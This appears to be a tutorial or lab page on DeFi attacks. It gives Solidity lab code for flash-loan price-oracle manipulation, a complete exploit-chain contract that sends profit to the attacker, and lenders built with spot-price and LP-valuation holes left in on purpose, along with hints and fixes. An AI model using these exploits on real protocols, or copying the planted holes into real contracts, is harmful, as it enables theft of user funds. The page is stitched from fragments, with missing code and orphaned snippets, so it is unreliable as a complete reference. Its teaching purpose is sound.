DeFi Attacks

DeFi Protocol Basics

Automated Market Makers (AMMs)

AMMs replace order books with liquidity pools. Constant product formula: x × y = k.

// Simplified Uniswap-style AMM
// Pool holds reserveA and reserveB tokens
// Trade: send dx of token A, receive dy of token B
// dy = (reserveB * dx) / (reserveA + dx)
// Price impact increases with trade size relative to reserves
ProtocolModelKey Feature
Uniswapx*y=kSimple, permissionless pools
CurveStableSwap invariantLow slippage for pegged assets
BalancerWeighted poolsMultiple tokens with custom weights

Lending Protocols

Deposit collateral, borrow other assets. If collateral value drops below threshold → liquidation.

ProtocolKey Mechanism
AaveVariable/stable rates, flash loans, aTokens
CompoundcTokens (interest-bearing), governance (COMP)
MakerDAOCDPs (Collateralized Debt Positions), DAI stablecoin

Yield Farming

Provide liquidity or stake tokens to earn rewards. Risk: impermanent loss, smart contract bugs, rug pulls.

Flash Loans

Borrow any amount with zero collateral — must repay within the same transaction or everything reverts. Available on Aave, dYdX, Uniswap V2+ (flash swaps).

// Aave V3 Flash Loan receiver
import "@aave/v3-core/contracts/flashloan/base/FlashLoanSimpleReceiverBase.sol";

contract MyFlashLoan is FlashLoanSimpleReceiverBase {
    constructor(IPoolAddressesProvider provider)
        FlashLoanSimpleReceiverBase(provider) {}

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,    // fee (usually 0.09%)
        address initiator,
        bytes calldata params
    ) external override returns (bool) {
        // --- YOUR LOGIC HERE ---
        // You have `amount` of `asset` to use

        // Approve repayment: amount + fee
        uint256 amountOwed = amount + premium;
        IERC20(asset).approve(address(POOL), amountOwed);
        return true;
    }

    function requestFlashLoan(address token, uint256 amount) external {
        POOL.flashLoanSimple(address(this), token, amount, "", 0);
    }
}

Flash Loan Attack Methodology

  1. Identify target: Protocol using on-chain spot prices (AMM reserves) as oracle
  2. Borrow: Take flash loan of large amount of token A
  3. Manipulate: Swap token A for token B on the AMM → skews reserves → price changes
  4. Exploit: Interact with target protocol that reads the now-manipulated price
  5. Profit: Extract value from the protocol at the wrong price
  6. Unwind: Swap back, repay flash loan + fee, pocket the difference
// Pseudocode: typical flash loan attack flow
function attack() external {
    // 1. Flash borrow 10,000 ETH
    aave.flashLoan(10000 ether);
}

function executeOperation(...) external {
    // 2. Dump 10,000 ETH into Uniswap ETH/TOKEN pool
    //    → TOKEN price spikes relative to ETH
    uniswap.swap(10000 ether → TOKEN);

    // 3. Deposit TOKEN into vulnerable lending protocol
    //    Protocol reads Uniswap price → thinks TOKEN is worth way more
    //    → Allows borrowing far more ETH than TOKEN is actually worth
    vulnerable.deposit(TOKEN);
    vulnerable.borrow(MAX_ETH);

    // 4. Swap TOKEN back to ETH on Uniswap (price normalizes)
    uniswap.swap(TOKEN → ETH);

    // 5. Repay flash loan, keep profit
    repay(10000 ether + fee);
    // Profit = borrowed ETH - flash loan fee
}

Sandwich Attacks

MEV bot monitors mempool for large pending DEX swaps:

  1. Front-run: Buy the target token before victim's swap (pushes price up)
  2. Victim's swap: Executes at worse price due to increased slippage
  3. Back-run: Sell the token at the now-higher price

Prevention: Use private mempools (Flashbots Protect, MEV Blocker), set tight slippage tolerance, use limit orders.

Liquidity Pool Attacks

LP token price manipulation: If a protocol values LP tokens based on the underlying reserves, an attacker can donate assets to the pool to inflate LP token value, use overvalued LP tokens as collateral, then borrow against them.

// Vulnerable LP valuation

Common Patterns Across Exploits

  • Oracle dependence: Spot price from AMM used as truth → flash-loan-manipulable
  • Composability risk: Protocols interacting create emergent attack surfaces
  • Bridge vulnerabilities: Cross-chain message verification is extremely hard to get right
  • Upgrade bugs: Storage collision or unprotected initializers during upgrades
  • Economic assumptions: Models break under extreme (flash-loan-sized) capital

Lab 2: Price Manipulation Attack

Medium

Objective: Set up a vulnerable lending protocol that reads price from an AMM. Use a flash loan to manipulate the AMM price, borrow at the wrong price, and profit.

Step 1: Simplified AMM + Vulnerable Lending Protocol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract TokenA is ERC20 {
    constructor() ERC20("TokenA", "TKA") {
        _mint(msg.sender, 1_000_000 ether);
    }
}

contract TokenB is ERC20 {
    constructor() ERC20("TokenB", "TKB") {
        _mint(msg.sender, 1_000_000 ether);
    }
}

// Simple AMM with x*y=k
contract SimpleAMM {
    IERC20 public tokenA;
    IERC20 public tokenB;
    uint256 public reserveA;
    uint256 public reserveB;

    constructor(address _a, address _b) {
        tokenA = IERC20(_a);
        tokenB = IERC20(_b);
    }

    function addLiquidity(uint256 amountA, uint256 amountB) external {
        tokenA.transferFrom(msg.sender, address(this), amountA);
        tokenB.transferFrom(msg.sender, address(this), amountB);
        reserveA += amountA;
        reserveB += amountB;
    }

    function swap(address tokenIn, uint256 amountIn) external returns (uint256) {
        bool isA = tokenIn == address(tokenA);
        (IERC20 tIn, IERC20 tOut, uint256 rIn, uint256 rOut) = isA
            ? (tokenA, tokenB, reserveA, reserveB)
            : (tokenB, tokenA, reserveB, reserveA);

        tIn.transferFrom(msg.sender, address(this), amountIn);
        uint256 amountOut = (rOut * amountIn) / (rIn + amountIn);
        tOut.transfer(msg.sender, amountOut);

        if (isA) { reserveA += amountIn; reserveB -= amountOut; }
        else     { reserveB += amountIn; reserveA -= amountOut; }

        return amountOut;
    }

    function getPrice() external view returns (uint256) {
        return reserveB * 1e18 / reserveA;  // price of A in terms of B
    }
}

// Vulnerable: uses AMM spot price as oracle
contract VulnerableLender {
    SimpleAMM public amm;
    IERC20 public tokenA;
    IERC20 public tokenB;
    mapping(address => uint256) public collateral;

    constructor(address _amm, address _a, address _b) {
        amm = SimpleAMM(_amm);
        tokenA = IERC20(_a);
        tokenB = IERC20(_b);
    }

    function depositCollateral(uint256 amount) external {
        tokenA.transferFrom(msg.sender, address(this), amount);
        collateral[msg.sender] += amount;
    }

    function borrow(uint256 amount) external {
        uint256 price = amm.getPrice();  // VULNERABLE: spot price
        uint256 collateralValue = collateral[msg.sender] * price / 1e18;
        require(collateralValue >= amount, "Undercollateralized");
        tokenB.transfer(msg.sender, amount);
    }
}

    await A.connect(attacker).approve(await AMM.getAddress(), ethers.parseEther("9000"));

    // Simpler: just swap large amount of A to get lots of B
    // This changes the ratio making A appear more expensive

    // Swap to manipulate: dump lots of A → reserveA goes up → A appears cheap
    // We need A to appear EXPENSIVE. So dump B instead.
    // Give attacker some B to dump

    const newPrice = await AMM.getPrice();
    console.log("Manipulated price:", ethers.formatEther(newPrice));

    // 3. Borrow max tokenB from lender at inflated collateral value
    await Lender.connect(attacker).borrow(ethers.parseEther("40000"));

    const stolen = await B.balanceOf(attacker.address);
    console.log("Attacker tokenB balance:", ethers.formatEther(stolen));

Lab 3: Full Flash Loan Exploit Chain

Hard

Objective: Combine a flash loan with price oracle manipulation and reentrancy in a single transaction. Borrow from a flash loan provider, manipulate an AMM price, exploit a vulnerable lending protocol, and repay — all atomically.

Attack Contract
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IFlashLender {
    function flashLoan(address receiver, uint256 amount) external;
}

interface ISimpleAMM {
    function swap(address tokenIn, uint256 amountIn) external returns (uint256);
    function getPrice() external view returns (uint256);
}

interface IVulnerableLender {
    function depositCollateral(uint256 amount) external;
    function borrow(uint256 amount) external;
}

contract FullExploitChain {
    IFlashLender public flashLender;
    ISimpleAMM public amm;
    IVulnerableLender public lender;
    IERC20 public tokenA;
    IERC20 public tokenB;
    address public attacker;

    constructor(
        address _flashLender,
        address _amm,
        address _lender,
        address _tokenA,
        address _tokenB
    ) {
        flashLender = IFlashLender(_flashLender);
        amm = ISimpleAMM(_amm);
        lender = IVulnerableLender(_lender);
        tokenA = IERC20(_tokenA);
        tokenB = IERC20(_tokenB);
        attacker = msg.sender;
    }

    function attack() external {
        // Step 1: Flash borrow large amount of tokenB
        flashLender.flashLoan(address(this), 100_000 ether);
    }

    // Called by flash lender
    function onFlashLoan(uint256 amount) external {
        // Step 2: Dump tokenB into AMM → inflate tokenA price
        tokenB.approve(address(amm), amount);
        amm.swap(address(tokenB), amount);

        // Step 3: Deposit small tokenA collateral into lender
        uint256 collateral = tokenA.balanceOf(address(this));
        tokenA.approve(address(lender), collateral);
        lender.depositCollateral(collateral);

        // Step 4: Borrow at inflated price
        lender.borrow(50_000 ether);

        // Step 5: Swap tokenA back for tokenB to repay
        uint256 tokenABal = tokenA.balanceOf(address(this));
        if (tokenABal > 0) {
            tokenA.approve(address(amm), tokenABal);
            amm.swap(address(tokenA), tokenABal);
        }

        // Step 6: Repay flash loan
        uint256 repayAmount = amount + (amount / 1000); // 0.1% fee
        tokenB.transfer(address(flashLender), repayAmount);

        // Step 7: Send profit to attacker
        tokenB.transfer(attacker, tokenB.balanceOf(address(this)));
    }
}

Key insight: The entire attack happens in a single transaction. If any step fails, everything reverts — zero risk for the attacker (except gas costs).

Lab 6: Liquidity Provision and Impermanent Loss

Medium

Objective: Provide liquidity to a Uniswap V2 pool, simulate price movement, and calculate impermanent loss vs just holding the tokens.

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Simplified AMM for IL calculation
contract ILCalculator {
    // Calculate impermanent loss given price ratio change
    // price_ratio = new_price / old_price
    // IL = 2 * sqrt(price_ratio) / (1 + price_ratio) - 1
    function impermanentLoss(uint256 priceRatioBps) public pure returns (int256) {
        // priceRatioBps = 15000 means price went up 50% (1.5x)
        // Returns IL in basis points (negative = loss)

        // Using fixed-point math:
        // sqrt approximation for demonstration
        uint256 sqrtRatio = sqrt(priceRatioBps * 10000);  // sqrt(ratio * 10000)
        uint256 numerator = 2 * sqrtRatio;
        uint256 denominator = 10000 + priceRatioBps;
        int256 il = int256(numerator * 10000 / denominator) - 10000;
        return il;  // negative = loss vs holding
    }

    function sqrt(uint256 x) internal pure returns (uint256) {
        if (x == 0) return 0;
        uint256 z = (x + 1) / 2;
        uint256 y = x;
        while (z < y) { y = z; z = (x / z + z) / 2; }
        return y;
    }
}

        wrappedBalance[msg.sender] -= amount;
        payable(msg.sender).transfer(amount);
    }
}

Hint: The processDeposit function accepts a signature parameter but never validates it. Call it with any depositor (your address), any amount (huge), any sourceChainTxHash (random), and any signature (empty or garbage). The contract processes the fake deposit and credits your account. This mirrors real bridge exploits like Wormhole ($320M) where the verification step was bypassed. Fix: implement proper ECDSA signature verification against the oracle's public key.

Challenge 9: LP Token Manipulation

Medium

A lending protocol accepts LP tokens as collateral and values them using the underlying pool's reserves. Manipulate the pool's reserves to inflate your LP token value and overborrow.

contract SimpleLPLender {
    address public lpToken;
    address public pool;  // AMM pool
    mapping(address => uint256) public collateral;  // LP tokens deposited

    constructor(address _lp, address _pool) payable {
        lpToken = _lp;
        pool = _pool;
    }

    // Vulnerable: values LP using current reserves
    function getLPValue(uint256 lpAmount) public view returns (uint256) {
        uint256 totalLP = IERC20(lpToken).totalSupply();
        (uint256 r0, uint256 r1) = IPool(pool).getReserves();
        // LP value = (r0 + r1) * lpAmount / totalLP
        // Donating to pool inflates r0/r1 without increasing totalLP!
        return (r0 + r1) * lpAmount / totalLP;
    }

    function depositLP(uint256 amount) external {
        IERC20(lpToken).transferFrom(msg.sender, address(this), amount);
        collateral[msg.sender] += amount;
    }

    function borrow(uint256 ethAmount) external {
        uint256 value = getLPValue(collateral[msg.sender]);
        require(value >= ethAmount, "Undercollateralized");
        payable(msg.sender).transfer(ethAmount);
    }
}

interface IPool {
    function getReserves() external view returns (uint256, uint256);
}

(8) The pool reserves go back to normal on the next swap, but you already borrowed. Fix: use the Alpha Homora fair LP pricing formula: value = 2 * sqrt(r0 * r1) * sqrt(p0 * p1) / totalLP.
